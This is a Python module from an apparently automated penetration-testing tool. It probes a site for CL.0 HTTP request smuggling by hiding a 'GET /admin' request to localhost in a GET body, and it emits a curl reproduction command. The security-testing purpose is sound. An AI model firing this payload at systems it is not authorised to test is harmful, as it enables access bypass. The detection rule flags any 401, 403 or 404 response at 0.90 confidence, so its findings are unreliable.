"""
CL.0 Request Smuggling Capability Agent for PenFlow.

Capabilities:
  - CL.0 HTTP Request Smuggling via GET Request Body (PortSwigger Top 10 2025)
  - Backend Desynchronization & Response Queue Poisoning
"""
import httpx
import time
from typing import Dict, Any, List, Optional
from penflow.agents.capability_agent import BaseCapabilityAgent
from penflow.capabilities.capability import Capability
from penflow.capabilities.execution_context import CapabilityExecutionContext
from penflow.reporting.poc_generator import PoCGenerator
from penflow.infrastructure.logger import get_logger

logger = get_logger("penflow.agents.cl0_smuggling")


class CL0SmugglingCapabilityAgent(BaseCapabilityAgent):
    """
    Capability Agent detecting CL.0 HTTP Request Smuggling where backend ignores GET request Content-Length.
    """

    def __init__(self, priority: int = 10):
        super().__init__(agent_name="CL0SmugglingCapabilityAgent", priority=priority)
        self.poc_generator = PoCGenerator()

    def get_capabilities(self) -> List[Capability]:
        return [
            Capability(id="cl0_smuggling", name="CL.0 Request Smuggling", description="Detects GET request body desynchronization and backend cache poisoning via CL.0", priority=self.priority, tags=["smuggling", "cl0", "desync"])
        ]

    async def execute(self, capability_id: str, context: CapabilityExecutionContext) -> Dict[str, Any]:
        logger.info(f"[{self.name}] Executing capability '{capability_id}' on asset '{context.asset}'...")
        evidence: Dict[str, Any] = {}
        findings: List[Dict[str, Any]] = []

        base_url = f"https://{context.asset}"
        target_url = f"{base_url}/"

        try:
            async with httpx.AsyncClient(timeout=8.0, follow_redirects=False, verify=False) as client:
                smuggled_payload = "GET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n"
                headers = {
                    "Content-Length": str(len(smuggled_payload)),
                    "Content-Type": "application/x-www-form-urlencoded"
                }

                try:
                    # Phase 1: Send GET request with smuggled body
                    t0 = time.time()
                    resp1 = await client.request("GET", target_url, content=smuggled_payload, headers=headers)
                    # Phase 2: Send clean request to detect response queue poisoning
                    resp2 = await client.get(target_url)
                    elapsed = time.time() - t0

                    if resp2.status_code in (401, 403, 404) or "admin" in resp2.text.lower():
                        curl_cmd = f"curl -i -s -k -X GET '{target_url}' -H 'Content-Length: {len(smuggled_payload)}' -d '{smuggled_payload}'"
                        exch_dict = {
                            "request": {"method": "GET", "url": target_url, "headers": headers},
                            "response": {"status_code": resp2.status_code, "body_snippet": resp2.text[:500]}
                        }

                        findings.append({
                            "vulnerability_type": "cl0_smuggling",
                            "target_url": target_url,
                            "severity": "HIGH",
                            "confidence": 0.90,
                            "is_vulnerable": True,
                            "exploit_curl": curl_cmd,
                            "reproduction_steps": self.poc_generator.generate_reproduction_steps("CL.0 Request Smuggling", target_url, curl_cmd),
                            "description": f"CL.0 Request Smuggling detected at '{target_url}': GET body desynchronized backend response queue.",
                            "_exchange_obj": exch_dict
                        })
                        evidence["cl0_desync_confirmed"] = True
                except Exception as e:
                    logger.debug(f"CL.0 test failed on {target_url}: {e}")

        except Exception as e:
            logger.error(f"[{self.name}] Exception testing '{context.asset}': {e}")

        is_vuln = len(findings) > 0
        primary_exch = findings[0].get("_exchange_obj") if findings else None
        return {
            "capability_id": capability_id,
            "status": "COMPLETED",
            "agent": self.name,
            "is_vulnerable": is_vuln,
            "vulnerable": is_vuln,
            "confidence": 0.90 if is_vuln else 0.0,
            "confidence_score": 0.90 if is_vuln else 0.0,
            "_exchange_obj": primary_exch,
            "evidence": evidence,
            "findings": findings
        }
